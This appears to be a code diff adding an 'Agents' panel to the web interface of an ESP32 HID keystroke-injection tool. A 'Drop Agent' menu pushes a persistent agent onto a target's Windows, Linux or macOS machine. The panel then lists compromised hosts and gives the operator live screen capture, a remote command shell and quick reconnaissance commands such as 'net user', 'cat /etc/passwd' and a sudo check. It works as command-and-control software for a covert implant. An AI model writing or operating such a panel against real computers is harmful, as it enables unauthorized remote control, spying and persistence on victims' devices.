@@ -406,6 +406,84 @@ select:focus { outline: none; border-color: var(--green); }
   color: var(--green);
 }
 .screen-box .screen-spinner[hidden] { display: none; }
+
+/* ── device cards ── */
+.device-list { display: flex; flex-direction: column; gap: 8px; }
+
+.device-card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 12px 14px;
+  cursor: pointer;
+  transition: border-color .15s;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+.device-card:hover { border-color: var(--green); }
+.device-card.selected { border-color: var(--green); background: var(--bg3); }
+.device-card.offline { opacity: .55; }
+
+.device-dot {
+  width: 9px; height: 9px; border-radius: 50%; flex-shrink: 0;
+  background: var(--red); box-shadow: 0 0 5px var(--red);
+}
+.device-dot.on { background: var(--green); box-shadow: 0 0 8px var(--green); }
+
+.device-info { flex: 1; min-width: 0; }
+.device-host { font-weight: 700; font-size: .88em; color: var(--fg); }
+.device-meta { font-size: .72em; color: var(--fg2); margin-top: 2px; }
+
+.device-actions { display: flex; gap: 6px; flex-shrink: 0; }
+
+/* ── device control panel ── */
+.dev-panel {
+  background: var(--bg2);
+  border: 1px solid var(--green);
+  border-radius: 6px;
+  margin-top: 12px;
+}
+.dev-panel-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 14px;
+  border-bottom: 1px solid var(--border);
+  flex-wrap: wrap;
+}
+.dev-tabs { display: flex; gap: 4px; padding: 10px 14px 0; }
+.dev-tab {
+  padding: 6px 14px; border-radius: 4px 4px 0 0; font-size: .8em;
+  cursor: pointer; border: 1px solid var(--border); border-bottom: none;
+  background: var(--bg3); color: var(--fg2); transition: background .1s;
+}
+.dev-tab.active { background: var(--bg2); color: var(--green); border-color: var(--green); }
+.dev-tab-body { padding: 12px 14px; }
+
+/* ── drop agent dropdown ── */
+.drop-wrap { position: relative; display: inline-block; }
+.drop-menu {
+  display: none; position: absolute; right: 0; top: 100%; margin-top: 4px;
+  background: var(--bg3); border: 1px solid var(--green); border-radius: 4px;
+  z-index: 100; min-width: 200px;
+}
+.drop-menu.open { display: block; }
+.drop-item {
+  padding: 9px 14px; cursor: pointer; font-size: .82em; color: var(--fg);
+  transition: background .1s;
+}
+.drop-item:hover { background: var(--bg2); color: var(--green); }
+
+/* ── device screen box ── */
+.dev-screen {
+  background: #000; border-radius: 4px; overflow: hidden;
+  min-height: 180px; display: flex; align-items: center; justify-content: center;
+  position: relative;
+}
+.dev-screen img { width: 100%; display: block; }
+.dev-screen-empty { color: var(--fg2); font-size: .8em; padding: 24px; text-align: center; }
 </style>
 </head>
 <body>
@@ -415,10 +493,22 @@ select:focus { outline: none; border-color: var(--green); }
     <div class="dot" id="mqttDot"></div>
     ESP32 HID Remote
   </div>
-  <div class="status-line">
-    <span class="badge red" id="badgeMqtt">MQTT: connecting…</span>
-    <span class="badge" id="badgeEsp">ESP32: unknown</span>
-    <span class="badge" id="badgeTarget" style="display:none;">TARGET: –</span>
+  <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+    <div class="status-line">
+      <span class="badge red" id="badgeMqtt">MQTT: connecting…</span>
+      <span class="badge" id="badgeEsp">ESP32: unknown</span>
+      <span class="badge" id="badgeTarget" style="display:none;">TARGET: –</span>
+    </div>
+    <div class="drop-wrap" id="dropWrap">
+      <button class="btn btn-primary" onclick="toggleDropMenu()" style="font-size:.8em;padding:6px 12px;">
+        ⚡ Drop Agent ▾
+      </button>
+      <div class="drop-menu" id="dropMenu">
+        <div class="drop-item" onclick="dropAgent('windows')">🪟 Windows (PowerShell)</div>
+        <div class="drop-item" onclick="dropAgent('linux')">🐧 Linux / Kali (Python3)</div>
+        <div class="drop-item" onclick="dropAgent('macos')">🍎 macOS (Python3)</div>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -432,6 +522,7 @@ select:focus { outline: none; border-color: var(--green); }
   <div class="tab active" onclick="switchTab('controls')">Controls</div>
   <div class="tab" onclick="switchTab('screen')">Screen</div>
   <div class="tab" onclick="switchTab('shell')">Shell</div>
+  <div class="tab" onclick="switchTab('devices')" id="tabDevices">Agents <span id="agentCount" style="display:none;background:var(--green);color:var(--bg);border-radius:8px;padding:1px 6px;font-size:.75em;margin-left:3px;"></span></div>
 </div>
 
 <!-- ── Controls tab ── -->
@@ -851,6 +942,82 @@ select:focus { outline: none; border-color: var(--green); }
 
 </div><!-- end tab-shell -->
 
+<!-- ── Agents tab ── -->
+<div class="tab-panel" id="tab-devices">
+
+  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
+    <div>
+      <span style="font-size:.7em;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--fg2);">Active Agents</span>
+      <span id="devListStatus" style="font-size:.72em;color:var(--fg2);margin-left:8px;"></span>
+    </div>
+    <button class="btn" onclick="loadDevices()" style="font-size:.78em;padding:5px 10px;">↻ Refresh</button>
+  </div>
+
+  <div id="devNoAgents" class="card" style="text-align:center;padding:24px;color:var(--fg2);font-size:.82em;">
+    No agents connected yet.<br><br>
+    Use <strong>⚡ Drop Agent</strong> to install a persistent agent on the target device.
+  </div>
+
+  <div id="deviceListEl" class="device-list"></div>
+
+  <!-- Per-device control panel (shown when a device is selected) -->
+  <div class="dev-panel" id="devPanel" style="display:none;">
+    <div class="dev-panel-header">
+      <button class="btn" onclick="closeDevPanel()" style="font-size:.78em;padding:5px 10px;">← Back</button>
+      <div style="flex:1;">
+        <div style="font-weight:700;font-size:.9em;color:var(--fg);" id="dpHostname"></div>
+        <div style="font-size:.72em;color:var(--fg2);margin-top:2px;" id="dpMeta"></div>
+      </div>
+      <button class="btn" onclick="uninstallDevice()" style="border-color:var(--red);color:var(--red);font-size:.78em;padding:5px 10px;">
+        ✕ Uninstall
+      </button>
+    </div>
+
+    <div class="dev-tabs">
+      <div class="dev-tab active" id="dtab-screen" onclick="switchDevTab('screen')">Screen</div>
+      <div class="dev-tab" id="dtab-shell" onclick="switchDevTab('shell')">Shell</div>
+      <div class="dev-tab" id="dtab-info" onclick="switchDevTab('info')">Info</div>
+    </div>
+
+    <!-- Screen sub-tab -->
+    <div class="dev-tab-body" id="dtabBody-screen">
+      <div style="display:flex;gap:6px;margin-bottom:8px;align-items:center;flex-wrap:wrap;">
+        <button class="btn btn-primary" onclick="devScreenRefresh()" style="font-size:.78em;padding:5px 12px;">↻ Refresh</button>
+        <button class="btn" id="btnDevLive" onclick="toggleDevLive()" style="font-size:.78em;padding:5px 12px;">▶ Live</button>
+        <span id="devScreenStatus" style="font-size:.72em;color:var(--fg2);"></span>
+      </div>
+      <div class="dev-screen" id="devScreen">
+        <div class="dev-screen-empty" id="devScreenEmpty">No screenshot yet — click Refresh or wait for Live to start.</div>
+        <img id="devScreenImg" style="display:none;" alt="target screen">
+      </div>
+      <div style="font-size:.68em;color:var(--fg2);margin-top:5px;" id="devScreenTs"></div>
+    </div>
+
+    <!-- Shell sub-tab -->
+    <div class="dev-tab-body" id="dtabBody-shell" style="display:none;">
+      <div class="type-row" style="margin-bottom:8px;">
+        <input id="devCmdInput" placeholder="Command to run on target…" autocomplete="off" spellcheck="false"
+               onkeydown="if(event.key==='Enter'){sendDevCmd();event.preventDefault();}">
+        <button class="btn btn-primary" onclick="sendDevCmd()">Run</button>
+      </div>
+      <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:5px;margin-bottom:10px;" id="devQuickCmds"></div>
+      <div id="devShellOutput"
+           style="background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:10px;
+                  font-family:inherit;font-size:.8em;min-height:140px;max-height:360px;overflow-y:auto;
+                  white-space:pre-wrap;word-break:break-all;color:var(--green);scrollbar-width:thin;
+                  scrollbar-color:var(--border) transparent;">
+        <span style="color:var(--fg2);">Send a command — output appears here.</span>
+      </div>
+    </div>
+
+    <!-- Info sub-tab -->
+    <div class="dev-tab-body" id="dtabBody-info" style="display:none;">
+      <table style="width:100%;border-collapse:collapse;font-size:.82em;" id="devInfoTable"></table>
+    </div>
+  </div>
+
+</div><!-- end tab-devices -->
+
 <script>
 // ── config ──────────────────────────────────────────────────────────────────
 const DEFAULT_SUFFIX = '1d1308';
@@ -1045,7 +1212,7 @@ setInterval(() => {
 }, 10000);
 
 // ── tabs ─────────────────────────────────────────────────────────────────────
-const TAB_NAMES = ['controls', 'screen', 'shell'];
+const TAB_NAMES = ['controls', 'screen', 'shell', 'devices'];
 let _activeTab = 'controls';
 let _screenPollTimer = null;
 
@@ -1057,7 +1224,6 @@ function switchTab(name) {
   document.querySelectorAll('.tab-panel').forEach(p => {
     p.classList.toggle('active', p.id === 'tab-' + name);
   });
-  // Start/stop screen polling based on active tab
   if (name === 'screen') {
     pollScreenshot(); updateOsHint();
     if (!_screenPollTimer) _screenPollTimer = setInterval(pollScreenshot, 3000);
@@ -1066,6 +1232,267 @@ function switchTab(name) {
   }
   if (name === 'shell') { pollShellOutput(); startDevicePoll(); }
   else { clearInterval(_devPollTimer); _devPollTimer = null; }
+  if (name === 'devices') { loadDevices(); startDeviceListPoll(); }
+  else { clearInterval(_devListPollTimer); _devListPollTimer = null; stopDevLive(); }
+}
+
+// ── Agents / Devices tab ──────────────────────────────────────────────────────
+let _selectedDid  = null;
+let _devListPollTimer = null;
+let _devLiveTimer = null;
+let _devLiveOn    = false;
+let _devActiveTab = 'screen';
+let _devListBusy  = false;
+let _devHistLen   = 0;
+
+function startDeviceListPoll() {
+  if (_devListPollTimer) return;
+  _devListPollTimer = setInterval(loadDevices, 5000);
+}
+
+async function loadDevices() {
+  if (_devListBusy) return;
+  _devListBusy = true;
+  try {
+    const r = await fetch(RELAY_BASE + '/api/devices');
+    const devices = await r.json();
+    renderDeviceList(devices);
+    const online = devices.filter(d => d.online).length;
+    const cnt = document.getElementById('agentCount');
+    if (online > 0) { cnt.textContent = online; cnt.style.display = ''; }
+    else { cnt.style.display = 'none'; }
+    if (_selectedDid) refreshSelectedDevice(devices);
+  } catch(e) {}
+  _devListBusy = false;
+}
+
+function renderDeviceList(devices) {
+  const el = document.getElementById('deviceListEl');
+  const none = document.getElementById('devNoAgents');
+  if (!devices.length) { none.style.display = ''; el.innerHTML = ''; return; }
+  none.style.display = 'none';
+  el.innerHTML = devices.map(d => {
+    const os = d.os || '?';
+    const osIcon = os.toLowerCase().includes('win') ? '🪟' : os.toLowerCase().includes('mac') ? '🍎' : '🐧';
+    const ago = d.ago < 60 ? d.ago + 's' : Math.round(d.ago/60) + 'm';
+    const sel = d.id === _selectedDid ? ' selected' : '';
+    const off = d.online ? '' : ' offline';
+    return `<div class="device-card${sel}${off}" onclick="selectDevice('${escHtml(d.id)}')">
+      <div class="device-dot ${d.online?'on':''}"></div>
+      <div class="device-info">
+        <div class="device-host">${osIcon} ${escHtml(d.hostname || 'unknown')}</div>
+        <div class="device-meta">${escHtml(os)} · ${escHtml(d.user||'?')} · ${escHtml(d.ip||'?')} · ${ago} ago ${d.persistent?'· persistent':''}</div>
+      </div>
+      <div class="device-actions">
+        <button class="btn" onclick="event.stopPropagation();selectDevice('${escHtml(d.id)}')" style="font-size:.75em;padding:4px 10px;">Control →</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function refreshSelectedDevice(devices) {
+  if (!_selectedDid) return;
+  const d = devices.find(x => x.id === _selectedDid);
+  if (!d) return;
+  if (_devActiveTab === 'screen') refreshDevScreen(d);
+  else if (_devActiveTab === 'shell') refreshDevHistory();
+}
+
+function selectDevice(did) {
+  _selectedDid = did;
+  loadDevices();
+  const panel = document.getElementById('devPanel');
+  panel.style.display = '';
+  fetch(RELAY_BASE + '/api/devices').then(r=>r.json()).then(devices => {
+    const d = devices.find(x => x.id === did);
+    if (!d) return;
+    document.getElementById('dpHostname').textContent = (d.hostname || 'unknown') + (d.persistent ? ' ⚡' : '');
+    const os = d.os || '?';
+    const osIcon = os.toLowerCase().includes('win') ? '🪟' : os.toLowerCase().includes('mac') ? '🍎' : '🐧';
+    document.getElementById('dpMeta').textContent = `${osIcon} ${os} · ${d.user||'?'} · ${d.ip||'?'}`;
+    populateQuickCmds(d.os || '');
+    switchDevTab('screen');
+    devScreenRefresh();
+  });
+}
+
+function closeDevPanel() {
+  _selectedDid = null;
+  stopDevLive();
+  document.getElementById('devPanel').style.display = 'none';
+  document.querySelectorAll('.device-card').forEach(c => c.classList.remove('selected'));
+}
+
+function switchDevTab(name) {
+  _devActiveTab = name;
+  ['screen','shell','info'].forEach(t => {
+    document.getElementById('dtab-' + t).classList.toggle('active', t === name);
+    document.getElementById('dtabBody-' + t).style.display = t === name ? '' : 'none';
+  });
+  if (name === 'shell') refreshDevHistory();
+  if (name === 'info') loadDevInfo();
+}
+
+async function devScreenRefresh() {
+  if (!_selectedDid) return;
+  const img = document.getElementById('devScreenImg');
+  const status = document.getElementById('devScreenStatus');
+  status.textContent = 'Loading…';
+  try {
+    const url = RELAY_BASE + '/api/devices/' + _selectedDid + '/screenshot?t=' + Date.now();
+    img.src = url;
+    img.onload = () => {
+      img.style.display = '';
+      document.getElementById('devScreenEmpty').style.display = 'none';
+      document.getElementById('devScreenTs').textContent = 'Updated ' + new Date().toLocaleTimeString();
+      status.textContent = '';
+    };
+    img.onerror = () => { status.textContent = 'No screenshot yet'; };
+  } catch(e) { status.textContent = 'Error: ' + e; }
+}
+
+function refreshDevScreen(d) {
+  if (!d.has_screenshot) return;
+  devScreenRefresh();
+}
+
+function toggleDevLive() {
+  if (_devLiveOn) { stopDevLive(); return; }
+  _devLiveOn = true;
+  document.getElementById('btnDevLive').textContent = '■ Stop';
+  document.getElementById('btnDevLive').style.cssText = 'background:var(--red);border-color:var(--red);color:#fff;font-size:.78em;padding:5px 12px;';
+  _devLiveTimer = setInterval(devScreenRefresh, 2500);
+}
+
+function stopDevLive() {
+  _devLiveOn = false;
+  if (_devLiveTimer) { clearInterval(_devLiveTimer); _devLiveTimer = null; }
+  const btn = document.getElementById('btnDevLive');
+  if (btn) { btn.textContent = '▶ Live'; btn.style.cssText = 'font-size:.78em;padding:5px 12px;'; }
+}
+
+async function sendDevCmd() {
+  if (!_selectedDid) return;
+  const inp = document.getElementById('devCmdInput');
+  const cmd = inp.value.trim();
+  if (!cmd) return;
+  inp.value = '';
+  try {
+    await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/cmd', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({cmd})
+    });
+    appendDevOutput('$ ' + cmd, 'var(--amber)');
+    setTimeout(refreshDevHistory, 3000);
+    setTimeout(refreshDevHistory, 6000);
+    setTimeout(refreshDevHistory, 12000);
+  } catch(e) { appendDevOutput('Error: ' + e, 'var(--red)'); }
+}
+
+async function refreshDevHistory() {
+  if (!_selectedDid) return;
+  try {
+    const r = await fetch(RELAY_BASE + '/api/devices/' + _selectedDid + '/history');
+    const hist = await r.json();
+    if (hist.length !== _devHistLen) {
+      _devHistLen = hist.length;
+      const out = document.getElementById('devShellOutput');
+      if (!hist.length) return;
+      out.innerHTML = hist.map(h =>
+        `<div style="margin-bottom:8px;border-bottom:1px solid var(--border);padding-bottom:6px;">` +
+        `<span style="color:var(--amber);">[${h.ts}] $ ${escHtml(h.cmd)}</span>\n` +
+        `<span style="color:var(--green);">${escHtml(h.out)}</span></div>`
+      ).join('');
+      out.scrollTop = out.scrollHeight;
+    }
+  } catch(e) {}
+}
+
+function appendDevOutput(text, color) {
+  const out = document.getElementById('devShellOutput');
+  const row = document.createElement('div');
+  row.style.color = color || 'var(--fg)';
+  row.textContent = text;
+  if (out.querySelector('span[style]')) out.innerHTML = '';
+  out.appendChild(row);
+  out.scrollTop = out.scrollHeight;
+}
+
+async function loadDevInfo() {
+  if (!_selectedDid) return;
+  try {
+    const r = await fetch(RELAY_BASE + '/api/devices');
+    const devices = await r.json();
+    const d = devices.find(x => x.id === _selectedDid);
+    if (!d) return;
+    const tbl = document.getElementById('devInfoTable');
+    const rows = [
+      ['Device ID', d.id], ['Hostname', d.hostname], ['OS', d.os],
+      ['User', d.user], ['IP', d.ip], ['Architecture', d.arch],
+      ['Status', d.online ? '● Online' : '⚫ Offline'],
+      ['Last Seen', d.ago + 's ago'], ['Persistent', d.persistent ? 'Yes ⚡' : 'No']
+    ];
+    tbl.innerHTML = rows.map(([k,v]) =>
+      `<tr><td style="color:var(--fg2);padding:5px 8px 5px 0;white-space:nowrap;">${escHtml(k)}</td>` +
+      `<td style="color:var(--fg);padding:5px 0;">${escHtml(String(v||'?'))}</td></tr>`
+    ).join('');
+  } catch(e) {}
+}
+
+async function uninstallDevice() {
+  if (!_selectedDid) return;
+  if (!confirm('Uninstall agent on this device? It will remove itself and all persistence.')) return;
+  try {
+    await fetch(RELAY_BASE + '/api/devices/' + _selectedDid, { method: 'DELETE' });
+    closeDevPanel();
+    setTimeout(loadDevices, 5000);
+    log('Uninstall command sent', 'ok');
+  } catch(e) { log('Uninstall failed: ' + e, 'err'); }
+}
+
+function populateQuickCmds(os) {
+  const el = document.getElementById('devQuickCmds');
+  const win = os.toLowerCase().includes('win');
+  const mac = os.toLowerCase().includes('mac');
+  const cmds = win ? [
+    ['whoami','whoami'], ['hostname','hostname'], ['ipconfig','ipconfig /all'],
+    ['users','net user'], ['procs','tasklist'], ['sysinfo','systeminfo'],
+    ['admin?','([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)'],
+  ] : mac ? [
+    ['whoami','whoami'], ['hostname','hostname'], ['ifconfig','ifconfig'],
+    ['users','dscl . list /Users|grep -v _'], ['procs','ps aux|head -20'], ['sysinfo','sw_vers'],
+  ] : [
+    ['whoami','whoami'], ['hostname','hostname'], ['ip addr','ip addr'],
+    ['users','cat /etc/passwd|cut -d: -f1'], ['procs','ps aux|head -20'], ['id','id'],
+    ['sudo?','sudo -n true && echo YES || echo NO'], ['uname','uname -a'],
+  ];
+  el.innerHTML = cmds.map(([label, cmd]) =>
+    `<div class="kbtn" onclick="runDevQuickCmd(${JSON.stringify(cmd)})">${escHtml(label)}</div>`
+  ).join('');
+}
+
+function runDevQuickCmd(cmd) {
+  document.getElementById('devCmdInput').value = cmd;
+  sendDevCmd();
+}
+
+// ── Drop Agent ────────────────────────────────────────────────────────────────
+function toggleDropMenu() {
+  document.getElementById('dropMenu').classList.toggle('open');
+}
+document.addEventListener('click', e => {
+  if (!document.getElementById('dropWrap').contains(e.target))
+    document.getElementById('dropMenu').classList.remove('open');
+});
+
+async function dropAgent(os) {
+  document.getElementById('dropMenu').classList.remove('open');
+  if (!client || !client.connected) { log('ESP32 not connected via MQTT', 'err'); return; }
+  log('Dropping ' + os + ' agent…', 'info');
+  publish({ type: 'shell', os });
+  // Switch to Agents tab to watch for the device to appear
+  setTimeout(() => { switchTab('devices'); }, 1000);
 }
 
 // ── OS config ─────────────────────────────────────────────────────────────────
@@ -1630,11 +2057,14 @@ restoreCamUrl();
 // Pause all polling when tab is hidden (browser backgrounded), resume on return
 document.addEventListener('visibilitychange', () => {
   if (document.hidden) {
-    clearInterval(_screenPollTimer); _screenPollTimer = null;
-    clearInterval(_devPollTimer);    _devPollTimer    = null;
+    clearInterval(_screenPollTimer);  _screenPollTimer  = null;
+    clearInterval(_devPollTimer);     _devPollTimer     = null;
+    clearInterval(_devListPollTimer); _devListPollTimer = null;
+    stopDevLive();
   } else {
-    if (_activeTab === 'screen') _screenPollTimer = setInterval(pollScreenshot, 3000);
-    if (_activeTab === 'shell')  startDevicePoll();
+    if (_activeTab === 'screen')  _screenPollTimer = setInterval(pollScreenshot, 3000);
+    if (_activeTab === 'shell')   startDevicePoll();
+    if (_activeTab === 'devices') startDeviceListPoll();
   }
 });
 </script>
